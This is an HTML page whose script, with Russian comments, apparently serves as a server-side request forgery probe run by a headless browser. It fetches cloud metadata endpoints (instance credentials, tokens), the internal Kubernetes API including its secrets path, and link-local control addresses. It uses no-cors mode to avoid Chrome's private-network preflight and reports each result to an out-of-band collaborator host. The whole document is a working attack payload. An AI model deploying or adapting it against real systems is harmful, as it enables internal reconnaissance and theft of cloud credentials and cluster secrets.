<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
function fire(path) {
  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
}

fire('/alive9?t=0');

// ГИПОТЕЗА v=6: Chrome PNA отправляет OPTIONS-preflight к link-local → IMDS игнорирует → timeout.
// mode:'no-cors' делает запрос "simple" → PNA preflight не нужен → прямой GET к IMDS.
// Если resolve() → сервер ответил (opaque response, status=0) — ПРОРЫВ.
// Если timeout → сервер не отвечает на HTTP вообще.

function noCorsFetch(label, url, timeoutMs) {
  var t0 = Date.now();
  fetch(url, {
    mode: 'no-cors',
    credentials: 'omit',
    signal: AbortSignal.timeout(timeoutMs || 2000),
  }).then(function(r) {
    // resolve = ответ получен (opaque: status=0, type='opaque')
    fire('/nc-ok-' + label + '?ms=' + (Date.now()-t0) + '&type=' + r.type + '&s=' + r.status);
  }).catch(function(e) {
    var ms = Date.now() - t0;
    var tag = ms >= (timeoutMs || 2000) - 50 ? 'to' : 'err';
    fire('/nc-' + tag + '-' + label + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 50)));
  });
}

// IMDS - все варианты через no-cors
noCorsFetch('imds-root',      'http://169.254.169.254/',                                   1500);
noCorsFetch('imds-meta',      'http://169.254.169.254/latest/meta-data/',                  1500);
noCorsFetch('imds-os-meta',   'http://169.254.169.254/openstack/latest/meta_data.json',    1500);
noCorsFetch('imds-os-net',    'http://169.254.169.254/openstack/latest/network_data.json', 1500);
noCorsFetch('imds-token',     'http://169.254.169.254/latest/api/token',                   1500);
noCorsFetch('gke170',         'http://169.254.170.2/v2/credentials',                       1500);
noCorsFetch('gke170-meta',    'http://169.254.170.2/v2/metadata/instance',                 1500);

// k8s API - no-cors
noCorsFetch('k8s-8080-ver',   'http://10.96.0.1:8080/version',                            2000);
noCorsFetch('k8s-8080-api',   'http://10.96.0.1:8080/api',                                2000);
noCorsFetch('k8s-8080-ns',    'http://10.96.0.1:8080/api/v1/namespaces/default/secrets',  2000);

// HTTPS к IMDS - если cert error → TLS handshake прошёл → сервер есть
// Если timeout → нет TLS сервера на порту 443
noCorsFetch('imds-https',     'https://169.254.169.254/',                                  1500);
noCorsFetch('imds-https-os',  'https://169.254.169.254/openstack/latest/meta_data.json',   1500);

// Контрольная точка: 169.254.1.1 (не IMDS, просто router link-local)
// Если тоже timeout → весь 169.254.0.0/16 принимает TCP (общий роутер)
// Если быстрая ошибка → 169.254.169.254 специфичен
noCorsFetch('ctrl-1691',      'http://169.254.1.1/',                                       1000);
noCorsFetch('ctrl-1692',      'http://169.254.0.1/',                                       1000);
</script>
</body>
</html>
